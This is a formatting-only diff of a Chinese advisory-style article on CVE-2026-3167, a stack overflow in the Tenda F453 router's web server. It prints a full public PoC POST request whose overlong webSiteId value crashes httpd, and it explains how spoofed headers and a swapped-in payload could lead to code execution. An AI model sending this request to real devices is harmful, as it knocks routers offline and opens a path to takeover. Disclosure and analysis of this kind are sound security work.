@@ -7,20 +7,20 @@ source: "gelusus/wxvl 公众号漏洞文库"
 zere
                     zere  船山信安   2026-03-02 04:15  
   
-   
+   
   
 # Tenda F453路由器高危漏洞分析  
 ## 漏洞背景  
   
 近日，**Li Tengzheng（LtzHust）**  
- 披露了 **Tenda F453**  
- 路由器固件版本 **V1.0.0.3**  
- 中的一个高危缓冲区溢出漏洞，编号 **CVE-2026-3167**  
-。该漏洞在   
+ 披露了 **Tenda F453**  
+ 路由器固件版本 **V1.0.0.3**  
+ 中的一个高危缓冲区溢出漏洞，编号 **CVE-2026-3167**  
+。该漏洞在   
 httpd  
- 组件的   
+ 组件的   
 /goform/webtypelibrary  
- ，   
+ ，   
 formWebTypeLibrary函数  
 中，发现  
 webSiteId用户参数输入时，  
@@ -37,27 +37,27 @@ webSiteId用户参数输入时，
   
 下面为公开的PoC请求：  
 ```
-POST /goform/webtypelibrary HTTP/1.1Host: 192.168.6.2X-Requested-With: XMLHttpRequestAccept-Language: en-US,en;q=0.9Accept: text/plain, */*; q=0.01User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36Referer: http://192.168.6.2/index.aspAccept-Encoding: gzip, deflate, brCookie: user=Connection: keep-aliveContent-Length: 410webSiteId=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+POST /goform/webtypelibrary HTTP/1.1Host: 192.168.6.2X-Requested-With: XMLHttpRequestAccept-Language: en-US,en;q=0.9Accept: text/plain, */*; q=0.01User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36Referer: http://192.168.6.2/index.aspAccept-Encoding: gzip, deflate, brCookie: user=Connection: keep-aliveContent-Length: 410webSiteId=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```  
   
-如果将请求发送至路由器，超长的 **webSiteId**  
- 参数（约400个 **a**  
+如果将请求发送至路由器，超长的 **webSiteId**  
+ 参数（约400个 **a**  
 ）就会被复制到栈缓冲区，导致栈溢出，即  
-httpd 进程崩溃（拒绝服务）。  
+httpd 进程崩溃（拒绝服务）。  
 ## PoC 构造原理分析  
-- • **POST 方法**  
+- • **POST 方法**  
 ：漏洞函数只响应POST请求，保证参数能通过请求体传递。  
   
-- • **请求头伪装**  
+- • **请求头伪装**  
 ：包含 X-Requested-With、Referer 等头部，使请求看起来来自合法管理页面，可能绕过简单的访问检查。  
   
-- • **超长数据**  
+- • **超长数据**  
 ：400个 a 超过目标缓冲区（64字节）大小，确保覆盖返回地址。  
   
-- • **单一字符 a**  
+- • **单一字符 a**  
 ：方便崩溃后通过调试确认内存被 0x61填满，验证漏洞存在。  
   
-攻击者如果将 **a**  
+攻击者如果将 **a**  
 替换自己设置的 payload，可能会控制返回地址，实现其任意代码执行。  
 ## 多款高危漏洞集中  
   
@@ -84,7 +84,7 @@ CVE-2026-3167 是一个典型的嵌入式设备缓冲区溢出漏洞，通过公
   
   
   
-   
+   
   
 
 
